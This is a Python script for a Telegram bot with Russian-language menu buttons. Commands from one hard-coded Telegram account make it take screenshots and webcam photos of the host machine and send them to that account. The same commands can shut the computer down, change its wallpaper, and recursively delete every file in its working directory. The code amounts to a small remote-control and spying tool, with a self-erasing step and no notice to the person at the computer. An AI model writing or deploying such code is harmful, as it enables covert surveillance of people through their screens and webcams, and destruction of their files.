import ctypes
import os
import random

import cv2
import pyautogui
import telebot
from telebot import types

bot = telebot.TeleBot('TOKEN')


@bot.message_handler(commands=['start'])
def get_text_messages(message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add('Сделать скриншот экрана😋')
    keyboard.add('Сделать фото с вебки🎃')
    keyboard.add('Выключить систему😋')
    keyboard.add('Поменять фон🎃')
    keyboard.add('Удалить все файлы связанные с ботом😋')
    bot.send_message(message.from_user.id, 'Выбирай бро', reply_markup=keyboard)


@bot.message_handler(content_types=['text'])
def send_text(message):
    if message.from_user.id == 763258583:
        if message.text == 'Сделать скриншот экрана😋':
            photo_name = make_screen()
            bot.send_photo(763258583, open(f'{photo_name}.png', 'rb'))
        elif message.text == 'Сделать фото с вебки🎃':
            photo_name = make_cam()
            bot.send_photo(763258583, open(f'{photo_name}.png', 'rb'))
        elif message.text == 'Выключить систему😋':
            off_pc()
        elif message.text == 'Удалить все файлы связанные с ботом😋':
            del_info()
        elif message.text == 'Поменять фон🎃':
            change_wallpaper()


def del_info():
    data_paths = [os.path.join(pth, f)
                  for pth, dirs, files in os.walk(os.getcwd()) for f in files]
    for el in data_paths:
        os.remove(el)


def make_screen():
    name = random.randint(1, 143113)
    pyautogui.screenshot(f'folder/{name}.png')
    return f'folder/{name}'


def change_wallpaper():
    try:
        fons = ['fon_1.jpg', 'fon_2.jpg', 'fon_3.jpg']
        ctypes.windll.user32.SystemParametersInfoW(20, 0, f'folder/{random.choice(fons)}', 0)
    except:
        pass


def off_pc():
    os.system('shutdown -s')


def make_cam():
    name = f'{random.randint(1, 143113)}d'
    cap = cv2.VideoCapture(2)
    ret, frame = cap.read()
    cv2.imwrite(f'folder/{name}.png', frame)
    cap.release()
    return f'folder/{name}'


bot.polling(none_stop=True, interval=0)
